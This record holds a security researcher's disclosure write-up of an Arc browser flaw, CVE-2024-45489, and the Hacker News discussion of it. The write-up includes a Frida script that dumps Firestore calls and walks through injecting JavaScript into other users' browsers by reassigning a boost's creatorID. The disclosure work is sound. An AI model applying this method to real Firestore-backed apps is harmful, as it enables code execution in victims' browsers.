[
  {
    "id": 41597250,
    "title": "Gaining access to anyones Arc browser without them even visiting a website",
    "originLink": "https://kibty.town/blog/arc/",
    "originBody": "we start at the homepage of arc. where i first landed when i first heard of it. i snatched a download and started analysing, the first thing i realised was that arc requires an account to use, why do they require an account? introducing arcs cloud features so i boot up my mitmproxy instance and i sign up, and i see that they are using firebase for authentication, but no other requests, are they really just using firebase only for authentication? after poking around for a bit, i discovered that there was a arc featured called easels, easels are a whiteboard like interface, and you can share them with people, and they can view them on the web. when i clicked the share button however, there was no requests in my mitmproxy instance, so whats happening here? hacking objective-c based firebase apps from previous experience hacking an IOS based app, i immediately had a hunch on what this was, firestore. firestore is a database-as-a-backend service that allows for developers to not care about writing a backend, and instead write database security rules and make users directly access the database. this has of course sparked a lot of services having insecure or insufficient security rules and since researching that, i would like to call myself a firestore expert. firestore has a tendency to not abide by the system proxy settings in the Swift SDK for firebase, so going off my hunch, i wrote a frida script to dump the relevant calls. var documentWithPath = ObjC.classes.FIRCollectionReference[\"- documentWithPath:\"]; var queryWhereFieldIsEqualTo = ObjC.classes.FIRQuery[\"- queryWhereField:isEqualTo:\"]; var collectionWithPath = ObjC.classes.FIRFirestore[\"- collectionWithPath:\"]; function getFullPath(obj) { if (obj.path && typeof obj.path === \"function\") { return obj.path().toString(); } return obj.toString(); } var queryStack = []; function logQuery(query) { var queryString = `firebase.${query.type}(\"${query.path}\")`; query.whereClauses.forEach((clause) => { queryString += `.where(\"${clause.fieldName}\", \"==\", \"${clause.value}\")`; }); console.log(queryString); } Interceptor.attach(documentWithPath.implementation, { onEnter: function (args) { var parent = ObjC.Object(args[0]); var docPath = ObjC.Object(args[2]).toString(); var fullPath = getFullPath(parent) + \"/\" + docPath; var query = { type: \"doc\", path: fullPath, whereClauses: [] }; queryStack.push(query); logQuery(query); }, }); Interceptor.attach(collectionWithPath.implementation, { onEnter: function (args) { var collectionPath = ObjC.Object(args[2]).toString(); var query = { type: \"collection\", path: collectionPath, whereClauses: [] }; queryStack.push(query); }, }); Interceptor.attach(queryWhereFieldIsEqualTo.implementation, { onEnter: function (args) { var fieldName = ObjC.Object(args[2]).toString(); var value = ObjC.Object(args[3]).toString(); if (queryStack.length > 0) { var currentQuery = queryStack[queryStack.length - 1]; currentQuery.whereClauses.push({ fieldName: fieldName, value: value }); } }, onLeave: function (retval) {}, }); var executionMethods = [ \"- getDocuments\", \"- addSnapshotListener:\", \"- getDocument\", \"- addDocumentSnapshotListener:\", \"- getDocumentsWithCompletion:\", \"- getDocumentWithCompletion:\", ]; executionMethods.forEach(function (methodName) { if (ObjC.classes.FIRQuery[methodName]) { Interceptor.attach(ObjC.classes.FIRQuery[methodName].implementation, { onEnter: function (args) { if (queryStack.length > 0) { var query = queryStack.pop(); logQuery(query); } }, }); } }); function formatFirestoreData(data) { if (data.isKindOfClass_(ObjC.classes.NSDictionary)) { let result = {}; data.enumerateKeysAndObjectsUsingBlock_( ObjC.implement(function (key, value) { result[key.toString()] = value.toString(); }) ); return JSON.stringify(result); } return data.toString(); } var documentMethods = [ { name: \"- updateData:completion:\", type: \"update\" }, { name: \"- updateData:\", type: \"update\" }, { name: \"- setData:completion:\", type: \"set\" }, { name: \"- setData:\", type: \"set\" }, ]; documentMethods.forEach(function (method) { if (ObjC.classes.FIRDocumentReference[method.name]) { Interceptor.attach( ObjC.classes.FIRDocumentReference[method.name].implementation, { onEnter: function (args) { var docRef = ObjC.Object(args[0]); var data = ObjC.Object(args[2]); var fullPath = getFullPath(docRef); var formattedData = formatFirestoreData(data); console.log( `firebase.doc(\"${fullPath}\").${method.type}(${formattedData})` ); }, } ); } else { console.log(\"Warning: \" + method.name + \" not found\"); } }); hacky script, but it works. so i launched arc with the script loaded on startup and this is what i got: firebase.doc(\"preferences/UvMIUnuxJ2h0E47fmZPpHLisHn12\"); firebase.doc( \"preferences/UvMIUnuxJ2h0E47fmZPpHLisHn12/stringValues/autoArchiveTimeThreshold\" ); firebase.doc(\"preferences/UvMIUnuxJ2h0E47fmZPpHLisHn12\"); firebase.doc( \"preferences/UvMIUnuxJ2h0E47fmZPpHLisHn12/stringValues/autoArchiveLittleArcTimeThreshold\" ); firebase.doc(\"preferences/UvMIUnuxJ2h0E47fmZPpHLisHn12\"); firebase.doc( \"preferences/UvMIUnuxJ2h0E47fmZPpHLisHn12/stringValues/autoArchiveTimeThresholdsPerProfile\" ); firebase.doc(\"users/UvMIUnuxJ2h0E47fmZPpHLisHn12\"); firebase .collection(\"user_referrals\") .where(\"inviter_id\", \"==\", \"UvMIUnuxJ2h0E47fmZPpHLisHn12\"); firebase .collection(\"boosts\") .where(\"creatorID\", \"==\", \"UvMIUnuxJ2h0E47fmZPpHLisHn12\"); sick. so it looks like arc stores some preferences in firestore, along with a basic user object, referrals and boosts what the hell are arc boosts arc boosts are a way for users to customize websites, by blocking elements, changing fonts, colors, and even using their own custom css and js. do you see where this is going?, so, i manually logged into my account using my dummy page to test firebase accounts, and executed the exact same query to get my boosts: cool, let me create a simple boost on google.com hey! theres our boost, lets try changing some parameters around. i see that it queries by creatorID, and we cant query a different creator ID than the original, but what if we update our own boost to have another users id? well, i tried it with another account of mine, and this way the result when i went to google.com on the other computer (the victim one) what the fuck? it works? quick recap arc boosts can contain arbitrary javascript arc boosts are stored in firestore the arc browser gets which boosts to use via the creatorID field we can arbitrarily chage the creatorID field to any user id thus, if we were to find a way to easily get someone elses user id, we would have a full attack chain getting another users id user referrals when someone referrs you to arc, or you referr someone to arc, you automatically get their user id in the user_referrals table, which means you could just ask someone for their arc invite code and they'd likely give it published boosts you can share arc boosts (only if they don't have js in them) with other people, and arc has a public site with boosts, and boostSnapshots (published boosts) contain the user id of the creator. user easels arc has a feature called easels, which are basically whiteboards, you can share easels, and this also allows you to get someones user id. putting it together this would be the final attack chain: obtain the user id of the victim via one of the mentioned methods create a malicious boost with whatever payload you want on your own account update the boost creatorID field to the targets whenever the victim visits the targeted website, they will get compromised the browser company normally does not do bug bounties (update: see at the end of post), but for this catastrophic of a vuln, they decided to award me with $2,000 USD the timeline for the vulnerability: aug 25 5:48pm: got initial contact over signal (encrypted) with arc co-founder hursh aug 25 6:02pm: vulnerability poc executed on hursh's arc account aug 25 6:13pm: added to slack channel after details disclosed over encrypted format aug 26 9:41pm: vulnerability patched, bounty awarded sep 6 7:49pm: cve assigned (CVE-2024-45489) rce on priviliged pages while poking around, i saw that boosts actually execute for other protocols aswell (even though you cant create them in the client), so someone could create a boost targeting the page settings, and it would execute on chrome://settings, which allows further escalation of priviliges. privacy concerns while researching, i saw some data being sent over to the server, like this query everytime you visit a site: firebase .collection(\"boosts\") .where(\"creatorID\", \"==\", \"UvMIUnuxJ2h0E47fmZPpHLisHn12\") .where(\"hostPattern\", \"==\", \"www.google.com\"); the hostPattern being the site you visit, this is against arc's privacy policy which clearly states arc does not know which sites you visit. update in light of these vulnerabilities and to introduce new features arc is switching off of firebase. additionally, arc has published their own write-up addressing these issues a tldr version would be: confirming they had fixed the issue they are adding a feature to disable boosts in the client, preventing this vulnerability from happening on people that do not use boosts they are doing an audit of their current firebase ACL rules internally they have estabilished proper protocols for security issues additionally, from internal discussions with arc they are also: are fixing the mentioned privacy concerns in the v1.61.1 update moving off firebase for new features and products they are doing a external security audit for this version are starting a bug bounty program for further vulnerabilities",
    "commentLink": "https://news.ycombinator.com/item?id=41597250",
    "commentBody": "Gaining access to anyones Arc browser without them even visiting a website (kibty.town)872 points by xyzeva 19 hours agohidepastfavorite269 comments ha470 2 hours agoI’m Hursh, cofounder and CTO of The Browser Company (the company that makes Arc). Even though no users were affected and we patched it right away, the hypothetical depth of this vulnerability is unacceptable. We’ve written up some technical details and how we’ll improve in the future (including moving off Firebase and setting up a proper bug bounty program) here: https://arc.net/blog/CVE-2024-45489-incident-response. I'm really sorry about this, both the vuln itself and the delayed comms around it, and really appreciate all the feedback here – everything from disappointment to outrage to encouragement. It holds us accountable to do better, and makes sure we prioritize this moving forward. Thank you so much. reply ayhanfuat 1 hour agoparentWas the post written for HN users only? I cannot see it on your blog page (https://arc.net/blog). It’s not posted on your twitter either. Your whole handling seems to be responding only if there is enough noise about it. reply titaniumtown 0 minutes agorootparentNot a good look it not being on the main page! I personally use [zen browser](https://github.com/zen-browser/desktop); I like the ideas of Arc, but it always seemed sketchy to me, especially it being Chromium-based and closed-source. reply rachofsunshine 2 hours agoparentprevComments further down are concerned that on each page load, you're sending both the URL and a(n identifiable?) user ID to TBC. You may want to comment on that, since I think it's reasonable to say that those of us using not-Chrome (I don't use Arc personally, but I'm definitely in the 1% of browser users) are likely to also be the sort of person concerned with privacy. Vulnerabilities happen, but sending browsing data seems like a deliberate design choice. reply mthoms 1 hour agorootparentI think that is addressed in the post. Apparently the URL was only sent under certain conditions and has since been addressed: >We’ve fixed the issues with leaking your current website on navigation while you had the Boost editor open. We don’t log these requests anywhere, and if you didn’t have the Boosts editor open these requests were not made. Regardless this is against our privacy policy and should have never been in the product to begin with. Given the context (boosts need to know the URL they apply to after all) this indeed was a \"deliberate design choice\" but not in the manner you appear to be suggesting. It's still very worrisome, I agree. reply tyho 2 hours agoparentprevThere isn't really anything you can do to convince me that your team has the expertise to maintain a browser after this. It doesn't matter that you have fixed it, your team is clearly not capable of writing a secure browser, now or ever. I think this should be a resigning matter for the CTO. reply Insanity 56 minutes agorootparentWell, the current team perhaps. But it's also likely part of the startup mentally of \"move fast and break things\", which is not entirely compatible with the goal of the browser. reply avarun 1 hour agorootparentprevAnd what, you’re going to find them a new CTO? What kind of magical world do you live in where problems are solved by leaders resigning, instead of stepping up and taking accountability? reply smt88 12 minutes agorootparentTaking accountability can and should include admitting you're the wrong person for the job and resigning. reply bloopernova 2 hours agoparentprevWill you be increasing the bug bounty payout? $2,000 is a tiny fraction of what this bug is worth, I hope you will pay the discoverer a proper bounty. You've been handed a golden opportunity to set the right course. reply tanx16 1 hour agoparentprev> We’re also bolstering our security team, and have hired a new senior security engineer. Is there a reason why you don’t have any security-specific positions open on your careers site? reply exdsq 58 minutes agoparentprev$2000 is an absurdly small bounty here - you should up that reply NegativeLatency 43 minutes agoparentprevOnly $2k for an exploit like this? reply _kidlike 1 hour agoparentprevno mention of the pitiful bounty reward (2000 usd). only sorry and thanks. Please award this person a proper bounty. reply mirzap 20 minutes agoparentprevPay the guy properly. $2000 is an insult. It should be $50k. This kind of bug could be sold for 100-200k easily. reply ibash 56 minutes agoparentprevThanks for the response. While people might nitpick on how things were handled, the fact that you checked if anyone was affected and fixed it promptly is a good thing. reply zachrip 5 hours agoprevI just want to call out that there is a lot of blame put on firebase here in the comments but I think that's just people parroting stuff they don't actually know about (I don't use firebase, I have tried it out in the past though). This isn't some edge case or hard to solve thing in firebase, this is the easy stuff. The real issue here is that someone wrote an api that trusted the client to tell it who they were. At the end of the day this is an amateur mistake that likely took a 1 line diff to fix. Don't believe me? Check out the docs: https://firebase.google.com/docs/rules/rules-and-auth#cloud-... - `request.auth` gives you the user id you need (`request.auth.uid`). reply tr3ntg 3 hours agoparentAs someone with an app built on firebase, yes. As the author rightly points out, it's very easy to misconfigure, but basic security practices like these are highlighted in bright, bold warning text in the Firebase docs. Security rules are meant to be taken seriously, and it's your only line of defense. reply swatcoder 3 hours agorootparent> bold warning text in the Firebase docs. Unfortunately, we currently have an industry where highly paid \"engineers\" unironically believe that their job can be done by reading/watching random tutorials, googling for StackOverflow answers, and pasting code from gists. Attentively reading documentation or developing a mental model of how your tools work so that you know how they are built to be handled does not make it on to any job listing bullet points. It presumably fell off the bottom in favor of team spirit or brand enthusiasm or whatever. How many tutorials, community answers, and gists do you think conveyed that warning? reply 725686 2 minutes agorootparentNah, just ask ChatGPT. reply ggregoire 2 hours agorootparentprevReading/watching random tutorials and asking basic questions on SO __instead of reading the official docs__ is a trend I've observed for the last 10 years. Even for stuff pretty well documented like Python, Postgres, React, etc. reply prilo 1 hour agorootparentI often wonder how much this can be attributed to the pretty awful SEO of most documentation. I write mostly Python at work and it's infuriating how often GeeksForGeeks, W3Schools, Programiz, or RealPython pop up when I'm just trying to reference like, the arg order of a builtin, or the particular behavior. Django is worse, I often feel like I can't even find the doc when I know it's there and read it before. reply kchr 14 minutes agorootparentFor native documentation, why not just search the official docs at https://docs.python.org/ ? I find it to be very discoverable if you are looking for docs about a specific function or module. reply kevin_thibedeau 40 minutes agorootparentprevDocumentation is largely static content. It isn't their job to play SEO games to convince search engines to surface it in the query results. Documentation is not a revenue generator for Google so it gets buried below the sites with Doubleclick ads. reply jetbalsa 15 minutes agorootparentprevThis is why I switched to Kagi.com it gives me results that are much more sane for things I'm looking for when it comes to a programming stance reply Vegenoid 21 minutes agorootparentprevAttempting to find the relevant docs page via search engines is generally not a good way to go, you should go to the documentation and search from there. Bookmark the landing page of the documentation. reply jahewson 46 minutes agorootparentprevSadly true, but Firestore has a security rules emulator and encourages you to write unit tests for it! There's just so many levels of \"ignored all reasonable practices\" here. Where's the code review? Where's the security/privacy audit? reply JohnMakin 57 minutes agorootparentprevThis may or may not be fair, but in my view, the type of person that would opt for a firebase solution is probably the type of person most vulnerable to foot guns. reply pphysch 2 hours agorootparentprev\"don't trust the client / validate inputs\" is software security 101 reply dbalatero 1 hour agorootparentFor sure, I think the issue is – at what point in an engineer's development is that fact hammered home? For me it was hanging out with friends and learning fundamentals together, and then even more reinforced in the security course I took in college. For others, they might skip that elective in school (or their bootcamp will gloss over it), and they learn it the hard way later on the job? That said, ideally code review/peer review/design review would catch things like this. If this was a feature implemented by an engineer that wouldn't know any better, they should have at least some help from others around them. reply Vegenoid 9 minutes agorootparentThe issue is not about supporting engineers, this isn’t a pile-on to some poor engineer. It’s about choosing secure software, and avoiding software (particularly critical and vulnerable software like a web browser) from orgs that have built severe vulnerabilities into their software by incorrectly implementing something foundational to computer security. There are many smart engineers who I would not trust to build my web browser because they lack the domain knowledge to do so. That’s not a slight on them. But if a company hired those people to make a web browser, I wouldn’t trust that org’s software. reply bichiliad 3 hours agorootparentprevI think a system that makes it this easy to shoot yourself in the foot is probably not a great system. Documentation is important, and I'm glad it's clear and obvious, but humans make mistakes. You'd hope that the mistakes have less dire consequences. reply wredue 2 hours agorootparentprevNobody reads docs dude. They copy and paste stack overflow answers, and now, copilot answers, which is going to be based on stack overflow ultimately anyway. reply BobaFloutist 1 hour agorootparentMaybe docs should try to be consistently more accurate, up to date, and legible than (even) stack overflow answers ¯ \\ _ ( ツ ) _ / ¯ reply roywiggins 34 minutes agorootparentNone of that matters if it doesn't show up first or second in Google results. reply NewJazz 2 hours agorootparentprevJust with less context and review. reply bcrosby95 1 hour agoparentprevIt's interesting to see software engineers going from rolling their own auth, to not rolling their own auth, to not even noticing this quite blatant security problem. It doesn't matter if you roll your own auth or not, you need to understand a very basic fundamental of it all: never trust the client. reply NewJazz 2 hours agoparentprevAt the end of the day this is an amateur mistake God I wish. More than one of my coworkers has made this exact mistake with our (thankfully internal) front-end apps. reply albedoa 1 hour agorootparentAre you defining amateurs as people who are not your coworkers? It can still be an amateur mistake. reply randomdata 1 hour agorootparentCoworker implies paid work, and therefore they are not amateurs. They very well may make the same mistakes, but those mistakes would be professional mistakes. reply JohnMakin 56 minutes agorootparentWhy this level of pedantry when the meaning is absolutely clear? A professional can make an amateur mistake. This makes perfect sense. That isn't implying the professional is actually an amateur, but that he made a mistake that an amateur would make. reply kfarr 2 hours agoparentprevAgreed, if I understand correctly the fix to this issue would be the following rules inside of a \"match\" statement in firestore.rules which is plainly documented as firebase firestore security 101: ``` // Allow create new object if user is authenticated allow create: if request.auth != null; // Allow update or delete document if user is owner of document allow update, delete: if request.auth.uid == resource.data.ownerUID ``` reply segasaturn 9 minutes agoprevIt is remarkable that Arc has taken billions of dollars in VC cash but makes these rookie mistakes in securing their own backend that all of their users are accessing. Where are those billions of dollars going? Is it all just in marketing? reply water-data-dude 15 hours agoprevI just wanted to say, I enjoyed the little pixel art cat that runs towards wherever you click immensely. It’s one of those fun, whimsical little touches that I don’t see all that often. A reminder that the internet can be a fun, whimsical place if we want it to be :) reply Semaphor 13 hours agoparentAs I didn’t get that, it seems like the dev honors prefers-reduced-motion, and doesn’t display it in that case. Excellent of them, give joy to those who want it, prevent annoyances for those who hate them. reply jeroenhd 5 hours agorootparentIt does: https://github.com/adryd325/oneko.js/blob/main/oneko.js const isReducedMotion = window.matchMedia(`(prefers-reduced-motion: reduce)`) === true || window.matchMedia(`(prefers-reduced-motion: reduce)`).matches === true; if (isReducedMotion) return; Simple but effective. More websites should include this check. Well done, adryd325! reply mzs 12 hours agorootparentprevSame for me, on FF you can override it with: about:config ui.prefersReducedMotion = 0 https://developer.mozilla.org/en-US/docs/Web/CSS/@media/pref... reply hbn 10 minutes agoparentprevIt's cute but I just can't focus on the article knowing the cat is gonna move every time I move my mouse or scroll. I popped open my console and deleted him. Sorry, kitty reply mceachen 15 hours agoparentprevIt's doing great for being a 35-year-old cat! https://en.wikipedia.org/wiki/Neko_(software) reply johndough 13 hours agoparentprevOn Debian, you can install and run the cat with sudo apt install oneko oneko & Makes a great gift for colleagues who leave their computer unattended. reply bbarnett 10 hours agorootparentWell that was a rabbit hole. Current version is hard to even see with high-res screens. A few checks shows endless ports, code from the 90s and before, and all sorts of other fun. Wonder if the author will reply. reply 0x1ceb00da 5 hours agorootparentprevYou have sudo access to your colleagues computers? reply nkrisc 8 hours agoparentprevAnd here I was wishing it would go away and trying to find a way to hide it because on my phone it was always covering text. Firefox reader mode worked. reply wpietri 6 hours agoparentprevFor the curious, that specific cat goes back to 1989: https://en.wikipedia.org/wiki/Neko_(software) reply TiredOfLife 13 hours agoparentprevOn desktop it follows the mouse no need to click. reply lukan 10 hours agoparentprevI did not. On the firefox mobile browser it was just using screen space. reply zendaven 6 hours agoparentprevI guess it's removed? I don't see it. On Windows Chrome. reply brettermeier 7 hours agoparentprevIt is distracting and annoyed me, I stopped reading because of it. reply lelandfe 7 hours agorootparentI thought it just ran around on the top line of the header, and was quite taken with it. I then scrolled and it followed me right into the middle of a paragraph. Less taken, but cat's gonna cat. reply Borgz 10 hours agoprevAccording to this article, Arc requires an account and sends Google's Firebase the hostname of every page you visit along with your user ID. Does this make Arc the least private web browser currently being used? reply causal 6 hours agoparentI trashed Arc immediately after install when I found out having an account was mandatory. That seemed so silly, like toothbrushes-requiring-wifi absurd. How much moreso now. reply scblock 4 hours agorootparentTruly. I was looking for a privacy respecting Chromium-based browser to use for Web MiniDisc (https://web.minidisc.wiki/) and came across some enthusiastic praise for Arc. I downloaded it and it immediately wanted me to create an account to even use it. How can that possibly respect my privacy? It went right in the trash. reply timeon 1 hour agorootparentWhat is also strange that I only found out about account after download. Like it was standard thing for the browser. (Sure there are optional accounts in others but login-walled browser?) reply roywiggins 31 minutes agorootparentWindows is practically login-walled[0] at this point so I imagine people are slowly getting to expect it. [0] witness the magic incantations needed https://www.tomshardware.com/how-to/install-windows-11-witho... reply DevX101 46 minutes agorootparentprevI did the same. Requiring an account for a browser is immediately disqualifying. I don't care how many features it has. reply AzzyHN 2 hours agoparentprevI think OperaGX wins that award reply mrweasel 2 hours agoparentprevI'm also left wondering: How broken would Arc be, if Firebase was to go down? reply diggan 2 hours agorootparentI guess it's relatively easy to test, add the Firebase domain to your host file and point it to 127.0.0.1 and try to use the browser. Sometimes things like this handle connection failures better than \"never-ending connection attempts\", so you might want to try to add a throttle or something too for the traffic between the domain and the browser, might also trip it up. reply ko_pivot 18 hours agoprevThis is such a fantastic bug. Firebase security rules (like with other BaaS systems like Firebase) have this weird default that is hard to describe. Basically, if I write my own API, I will set the userId of the record (a 'boost' in this case) to the userId from the session, rather than passing it in the request payload. It would never even occur to a developer writing their own API past a certain level of experience to let the client pass (what is supposed to be) their own userId to a protected API route. On the other hand, with security rules you are trying to imagine every possible misuse of the system regardless of what its programmed use actually is. reply nottorp 13 hours agoparent> On the other hand, with security rules you are trying to imagine every possible misuse of the system regardless of what its programmed use actually is. Tbh you're doing it wrong if you go that way. Default deny, and then you only have to imagine the legitimate uses. reply ko_pivot 5 hours agorootparentFair enough, but my point is more conceptual, in that you still have to write `boost.userId == auth.userId` as an allowed pattern rather than making that pattern the only technically possible result, which is the convention in a traditional API. reply sorrythanks 7 hours agorootparentprevAnd then when you imagine the legitimate uses you have to imagine how allowing those legitimate uses could be misused. You always need to think red and blue. reply merco 4 minutes agoprevGreat catch ! Also very cool to know a bit more about the tech they are using. reply monroewalker 13 hours agoprevCan we have Arc added to the title of the post to better alert people who use or know people who use the browser? reply gcr 6 hours agoparentHuge agree. I didn’t realize this applied to me the first time I saw this story yesterday. It was the rename that got me to click. Honestly I strongly feel the title should be “fundamental bug in Arc browser (CVE 123-4567)” or similar. reply hollywood_court 6 hours agoprevThank you for sharing this. I have been using Arc since the first week of beta. The fact that they don't even mentioned this bug/fix on any of their social media is quite alarming. I enjoyed my time with Arc, but I can't possibly see myself continuing to use it after the way they handled this. reply Sakos 6 hours agoparentThem acknowledging the issue, then fixing it within 28 hours isn't good enough for you? That kind of response makes me happy to continue using Arc. reply ziddoap 20 minutes agorootparent>Them acknowledging the issue, then fixing it within 28 hours isn't good enough for you? Are you not concerned with the yet to be discovered vulnerabilities? What is concerning is the nature of the vulnerability and how it speaks to their security culture (which is obviously non-existent). This also revealed that their privacy policy is pure marketing fluff, completely disconnected from (and, in fact, counter to) their actions. If you are comfortable using a browser (probably the software with the largest risk and attack surface on your device) that had an embarrassingly rudimentary vulnerability, made by a company who lie about the most important promise of their privacy policy, then I've got a calculator app for you. reply chenmike 3 hours agorootparentprevI'm in the same boat as GP. Was invited early, loved the Arc UX far more than any other browser. I've recommended it to many people. As many other comments have pointed out, this vulnerability is such a rookie mistake that I don't think I can trust them again after this without understanding what factors in their security/engineering culture led to it. Patching this one issue isn't enough. reply tomaskafka 4 hours agorootparentprevThey afaik never said that they ‘fixed’ the issue where they’re sending Google your every visited url. reply pixxel 5 hours agorootparentprevnext [3 more] [flagged] Sakos 4 hours agorootparent1) What's with the hostility? 2) What exactly do I deserve? reply sanex 5 hours agorootparentprevA pleasant user experience? reply bhaney 16 hours agoprevThere are a lot of major security vulnerabilities in the world that were made understandably, and can be forgiven if they're handled responsibly and fixed. This is not one of them. In my opinion, this shows a kind of reputation-ruining incompetency that would convince me to never use Arc ever again. reply gwd 8 hours agoparentOn the other hand, this is pretty impressive: aug 25 5:48pm: got initial contact over signal (encrypted) with arc co-founder hursh aug 25 6:02pm: vulnerability poc executed on hursh's arc account aug 25 6:13pm: added to slack channel after details disclosed over encrypted format aug 26 9:41pm: vulnerability patched, bounty awarded sep 6 7:49pm: cve assigned (CVE-2024-45489) Four hours from out-of-the-blue initial contact until a fix pushed is pretty good, even given how simple this fix probably was. EDIT: Oh, the date changed; so it was 28 hours until fix. Still decent; and half an hour from initial contact to \"Join our slack channel\" is incredibly fast response time. reply Rygian 6 hours agorootparentReacting fast is the least the vendor could do. Bare minimum. This should not be applauded. It should be treated as \"well, at least they reacted at a reasonable speed so the root cause was probably not malice\". In other words, a quick turnaround with a fix does not lessen the impact of being negligent about security when designing the product. reply darby_nine 4 hours agorootparent> Reacting fast is the least the vendor could do. And yet, so few do. Let's remind ourselves the bar sank into the floor a long time ago. reply ActionHank 5 hours agorootparentprev\"They put the bandaid over the wound caused by a flagrant disregard for the users privacy, security, and safety.\" Phew, glad that's over and will never happen again. reply tadzik_ 8 hours agorootparentprev28 hours (note the date), but still reply tailspin2019 9 hours agoparentprevThe mandatory account just to try Arc was always a massive red flag to me - and led to me never trying it. Now I’m glad I didn’t! reply shermantanktop 4 hours agorootparentYou could have just borrowed someone else’s, it appears. reply mdaniel 2 hours agorootparentIronically, that would help the privacy concerns since it would intermingle all traffic in their analytics system. Win-win! reply bschmidt1 2 hours agorootparentprevNo Linux version prevented me from trying it, didn't even get to the account wall, who knows if there's a pay wall. Perhaps the \"moat\" concept was misunderstood. reply rpastuszak 7 hours agoparentprevHonestly I’ve always considered Arc to be a wolf in sheep’s clothing, especially when it comes to privacy. 50-60mm cash at 500mm (!) valuation and no business model is a big red flag when it comes to something as important, as personal as a browser. This is not a charity. Someone, somehow will have to pay for that. reply danpalmer 6 hours agorootparentYeah I’m so torn. It’s honestly the best browser UX I’ve seen, the right combination of vertical tabs, auto archiving, spaces/collections, sync, etc. I don’t care for Easels, but the core is good. Except… the growth hacks have started to creep in. They overlay an advert for their own AI services on top of regular Google search results pages in their mobile app. Not even a browser chrome UI element, it’s literally over the page content. That feels like a huge violation of what it means to be a browser. I don’t want their AI features. I don’t want growth hacks. I don’t want to sign in except for sync. I’d happily pay $40 a year for Arc as a product-focused-product, but as a VC-focused-product it’s heading downhill. reply jwells89 4 hours agorootparentIt does get a lot right and feels smooth in ways that Chrome, the various Chrome-clones, and Firefox just don't. It's also ironically the only browser even trying to feel native on Windows, using WinUI/WinAppSDK for its UI there, despite originally being Mac only. It's unfortunate that other cross platform browsers have such a strong tendency to phone in these little things, because they really do add up to make for a nicer experience. reply HungSu 3 hours agorootparentprevYou might like Zen Browser https://zen-browser.app/ reply emptysongglass 3 hours agorootparentOr Floorp: https://floorp.app reply rawsta 5 hours agorootparentprevHave you tried Vivaldi? It's really customizable and has a lot of features. reply mthoms 2 hours agorootparentprevI'm torn for the same reason: The UX hits all the right notes for me and I've tried every MacOS browser under the sun. I'm an ADHD sufferer and there's something about their combination of features and UI that just lets me get stuff done. And I don't even touch their AI features. This is all really sad news. reply endigma 15 hours agoparentprevAlso, firebase? seriously? this is a company with like, low level software engineers on payroll, and they are using a CRUD backend in a box. cost effective I guess? I wouldn't even have firebase on the long list for a backend if I were architecting something like this. Especially when feature-parity competitors like Supabase just wrap a normal DBMS and auth model. reply JumpCrisscross 11 hours agorootparent> low level software engineers on payroll How does The Browser Company make money? They're giving their product away for free. Browsers are complicated. It doesn't inspire confidence that the folks in charge of that complexity can't get their heads around a business model. (Aside: none of their stated company values have anything to do with the product or engineering [1]. They're all about how people feel.) [1] https://thebrowser.company/values/ reply coffeeling 7 hours agorootparentThey don't have a business model yet, is the thing. reply bschmidt1 1 hour agorootparentprevWell, it's an app that users access all their online info through - bank, email, search, work, social - everything. Even an open-source, decentralized, blockchain, grass-fed, organic, extra virgin, written in nothing but HTML, released by W3C itself browser could monetize just ~5% of market share if users are downloading their build (or if its baked into the source), considering how much a browser reveals about its user and to the extent the user can be retargeted for: Ads, marketing, surveillance, analytics. The biggest opportunity has to be driving search traffic to the major search providers all these browsers partner with. Could also get acquired by a major browser vendor if you have a better product and people are downloading it more than the major ones, especially if both are based on the same underlying engine. Even Firefox still sucks to this day. I'm using it right now (Waterfox) the product still sucks! I know of some browser vendors acquiring others, especially as mobile took off and it was hard to get it right. Seems like the opportunity is similar to that of social media but slightly more modern because nobody uses new social media anymore but people are trying out new browsers (and you get richer user/usage data). reply throwaway48540 8 hours agorootparentprevI don't see an issue, using something like Firebase is what a smart engineer would do. Just this one piece of logic is a problem. reply notoverthere 7 hours agorootparentI tend to agree with this. Why re-invent the wheel by spending engineering effort building a CRUD backend? If you're trying to bring value to market, focus on your core differentiator and use existing tooling for your boilerplate stuff. reply serial_dev 6 hours agorootparentIt’s the “chrome replacement we have been waiting for”, but (if I read this right), my data is still sent to Firebase? Also it’s a browser, not a “tinder but for cats” startup idea I’m writing for my cousin for a beer. It’s not only not a smart engineering decision, it’s also a terrible product, reputation and marketing decision. reply notoverthere 5 hours agorootparentI'm not disagreeing about the severity of the security vulnerability that has been uncovered – to be clear, it's an absolute shocker of a bug. It's really disappointing to see. But I still disagree that the use of Firebase, in and of itself, is a bad engineering decision. It's just a tool, and it's up to you how you use it. Firebase gives you all features needed to secure your backend. But if you configure it incorrectly, then _that's_ where the poor engineering comes into play. It should have been tested more comprehensively. Sure. You could build your own backend rather than using a Backend-as-a-Service platform. But for what gain? If you don't test it properly, you'll still be at risk of security holes. reply shermantanktop 4 hours agorootparentprev> a “tinder but for cats” startup idea Needs a name. Meowr? Hissr? reply duskwuff 1 hour agorootparentYowlr. (Which is apparently a dubstep musician.) reply arcisbad 9 hours agoparentprevThis convinced me to never use Arc again. I created a small guide to migrate from it to an open-source alternative: https://gist.github.com/clouedoc/4acc8355782f394152d8ce19cea... TL;DR: it's not possible to export data from Arc, but it's possible to copy-paste the folder to a Chrome profile, and Firefox and other browsers will detect&import it. reply trumad 2 hours agorootparentI also wrote a guide on ARC features that work better on Firefox: https://thannymack.com/#Arc%20features%20that%20work%20bette... reply Sakos 6 hours agorootparentprevUnfortunately, Zen Browser simply isn't an alternative. If you like Arc, then Zen's UI for tabs and splitting views isn't really anywhere close to satisfying the same needs. reply EraYaN 4 hours agorootparentAt least Firefox seems to be borrowing some of the UI features slowly. At least the Mozilla Foundation is very public with their wants and goals. reply EraYaN 4 hours agorootparentprevFirefox seems to be borrowing some of the UI features slowly (at least the vertical tabs). And at least the Mozilla Foundation is very public with their wants and goals. reply aaomidi 16 hours agoparentprevYou’d think that a company shipping a browser would pay a little more attention to security rules. Also, shame on firebase for not making this a bit more idiot proof. And really? $2500? That’s it? You could’ve owned literally every user of Arc… The NSA would’ve paid a couple more zeros on that. reply prmoustache 9 hours agorootparent> You could’ve owned literally every user of Arc… The NSA would’ve paid a couple more zeros on that. only the 17 users they have. Shouldn't a government sue you if you try to sell him out vuln unless you personally know people in charge? reply girvo 5 hours agorootparentArc has a lot more than 17 users. It’s surprisingly popular. reply netdevnet 7 hours agorootparentprevI guess not since they used the services of a company that could exploit vulns in ios reply nemomarx 15 hours agorootparentprevAre there a lot of Arc users? It seems like a pretty niche browser even compared to other niches. reply viraptor 12 hours agorootparentLots of developers and power users make a good chunk of Arc's use base. If you're after some interesting credentials then \"every Arc user\" is a perfect group with little noise. reply nicce 12 hours agorootparent> power users Not that many. Most power users don't like to be 